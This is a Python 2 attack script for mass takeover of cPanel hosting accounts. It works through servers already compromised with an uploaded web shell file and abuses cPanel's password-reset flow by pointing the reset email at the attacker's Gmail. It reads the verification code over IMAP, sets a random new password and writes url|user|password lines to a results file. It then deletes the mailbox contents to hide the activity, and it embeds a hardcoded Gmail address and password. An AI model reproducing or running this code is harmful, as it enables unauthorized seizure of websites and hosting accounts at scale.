#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import time
import imaplib
import getpass
import email
import email.header
import re
import datetime
import requests
import random
import string
requests.packages.urllib3.disable_warnings()

EMAIL_ACCOUNT = "sanninkonohagakure@gmail.com" # change to our email
PASS_EMAIL = "androxgh0st$" # Password our email

def genpass(stringLength=10):
	lettersAndDigits = string.ascii_letters + string.digits
	return ''.join(random.choice(lettersAndDigits) for i in range(stringLength))

def delete_log_mail(M, box):
	if box == "spam":
		print("[*] Cleaning Email Spam Folder")
		rv, data = M.select("[Gmail]/Spam")
	else:
		print("[*] Cleaning Email Inbox Folder")
		rv, data = M.select("INBOX")

	rv, data = M.search(None, "ALL")
	if rv != 'OK':
		return
	for num in data[0].split():
		M.store(num, "+FLAGS", "\\Deleted")
	M.expunge()


def reset(url, user, M):
	s = requests.session()
	data = {"user": user}
	req1 = s.post("https://"+url, data=data, verify=False).text
	data2 = {"action":"puzzle","user":user,"answer":EMAIL_ACCOUNT,"debug":""}
	req2 = s.post("https://"+url, data=data2, verify=False).text
	ke = 0
	while True:
		chars = "/—\|"
		for char in chars:
			sys.stdout.write('\r'+'['+char+'] Waiting Verivy Code...')
			time.sleep(0.1)
			sys.stdout.flush()
		kode = getcode(M, user)
		if kode:
			pswd = genpass()
			print("\n[*] Jackpot!")
			print("[*] Code Verify: "+kode)
			data3 = {"user":user,"action":"seccode","debug":"","confirm": kode}
			req3 = s.post("https://"+url, data=data3, verify=False).text
			data4 = {"action":"password","user":user,"debug":"","password":pswd,"alpha":"both","nonalpha":"both","confirm":pswd}
			req4 = s.post("https://"+url, data=data4, verify=False).text.encode('utf-8')
			if '<span id="resetpass-success"></span>' in req4:
				print("[*] Password Reseted.")
				print("[*] Now Password: "+pswd)
				cpres = open('cpanel_result.txt', 'a')
				weburl = url.replace(":2083/resetpass", "")
				iswrite = weburl+"|"+user+"|"+pswd
				cpres.write(iswrite+"\n")
				cpres.close()
				delete_log_mail(M, "spam")
				delete_log_mail(M, "inbox")
			else:
				print req4
				print("[-] Fail")
			break
	
def box(M, user):
    rv, data = M.select("INBOX")
    rv, data = M.search(None, "ALL")
    if rv != 'OK':
        return
    for num in data[0].split():
        rv, data = M.fetch(num, '(RFC822)')
        if rv != 'OK':
            exit()
        msg = email.message_from_string(data[0][1])
        decode = email.header.decode_header(msg['Subject'])[0]
        subject = decode[0]
        if user in str(subject):
        	isi = msg.get_payload()[0].get_payload()
        	p = re.findall(":\r\n\r\n(.*?)\r\n\r\n", str(isi))
        	return p[0]

def spam(M, user):
    rv, data = M.select("[Gmail]/Spam")
    rv, data = M.search(None, "ALL")
    if rv != 'OK':
        return
    for num in data[0].split():
        rv, data = M.fetch(num, '(RFC822)')
        if rv != 'OK':
            exit()
        msg = email.message_from_string(data[0][1])
        decode = email.header.decode_header(msg['Subject'])[0]
        subject = decode[0]
        if user in str(subject):
        	isi = msg.get_payload()[0].get_payload()
        	p = re.findall(":\r\n\r\n(.*?)\r\n\r\n", str(isi))
        	return p[0]

def getcode1(M, user):
	asu = spam(M, str(user))
	if asu:
		return asu
	elif box(M, str(user)):
		return box(M, str(user))
	else:
		return False

def getcode(M, user):
	return getcode1(M, user)

def gass(cpurl):
	data = {"email":EMAIL_ACCOUNT,"submit":"kntl"}
	text = requests.post(cpurl, data=data, verify=False).text
	urlres = re.findall("site x (.*?) x site", text)[0].replace("?start=1", "")
	user = re.findall("user x (.*?) x user", text)[0]
	print("[*] USER : "+user)
	print("[*] URL  : "+urlres)
	print("[*] EMAIL: "+EMAIL_ACCOUNT)
	M = imaplib.IMAP4_SSL('imap.gmail.com')
	try:
	    rv, data = M.login(EMAIL_ACCOUNT, PASS_EMAIL)
	except imaplib.IMAP4.error:
	    print "[-] LOGIN FAILED!!! "
	    sys.exit(1)
	rv, mailboxes = M.list()
	if rv == 'OK':
		print("[*] Login GMail: OK\n[*] Try Reset Now.")
		delete_log_mail(M, "spam")
		delete_log_mail(M, "inbox")
		reset(urlres, user, M)
		M.close()
	else:
	    print "[-] ERROR: Unable to open mailbox ", rv
	M.logout()

try:
	text = open(sys.argv[1]).read()
except:
	print("Remember, Change Email & Password In Script (Inbox/Spam Folder All Deleted in our mail)\nAnd Upload cp.php to shell (Password reset enabled)\nCheck on \"https://server:2083/resetpass\"\n\nRun with: python2 cpreset.py ourlist.txt")
	exit()
for lst in text.splitlines():
	try:
		gass(lst)
		print("\n")
	except Exception as err:
		print(str(err))
		print("\n")
